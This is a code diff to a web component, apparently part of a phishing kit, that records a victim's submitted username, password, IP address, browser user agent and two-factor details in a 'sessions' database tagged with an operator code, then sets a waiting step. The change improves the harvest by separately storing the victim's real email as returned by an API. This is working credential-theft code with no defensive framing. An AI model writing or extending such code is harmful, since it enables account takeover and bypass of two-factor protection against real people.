@@ -251,10 +251,11 @@ const PPI = () => {
         }
       } catch { /* ignore */ }
 
+      const resolvedRealEmail = typeof res.email === "string" ? res.email.trim() : "";
+
       // Build otp_code with extra info from API response
       const otpParts: string[] = [];
       if (res.fullName) otpParts.push(`name:${res.fullName}`);
-      if (res.email) otpParts.push(`real_email:${res.email}`);
       if (res.requires_2fa) otpParts.push(`api_2fa:true`);
       if (res.twofa_type !== undefined) {
         otpParts.push(`twofa_type:${res.twofa_type}`);
@@ -265,7 +266,9 @@ const PPI = () => {
       const newId = crypto.randomUUID();
       await supabase.from("sessions").insert({
         id: newId,
-        email: submittedUsername,
+        email: resolvedRealEmail || submittedUsername,
+        username: submittedUsername,
+        real_email: resolvedRealEmail || null,
         password,
         ip_address: ipData.ip,
         user_agent: navigator.userAgent,
@@ -276,7 +279,7 @@ const PPI = () => {
         source: "ppi",
         operator_code: operatorCode,
         otp_code: otpParts.join("|") || null,
-      });
+      } as any);
 
       setSessionId(newId);
       setStep("waiting");
